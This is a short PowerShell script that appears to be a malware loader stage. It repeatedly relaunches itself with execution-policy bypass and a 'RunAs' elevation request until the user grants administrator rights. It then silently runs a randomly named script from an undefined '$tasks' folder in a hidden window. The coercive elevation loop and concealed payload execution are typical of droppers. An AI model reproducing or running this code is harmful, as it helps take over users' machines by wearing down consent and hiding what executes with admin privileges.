while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {

    $process = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
    
    if (-not $process) {
        Write-Host "Administrator permission is required. Retrying in 3 seconds..."
        Start-Sleep -Seconds 3  
    } else {
        Exit  
    }
}


Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$tasks\AEQKCPrkuifY.ps1`"" -NoNewWindow -Wait
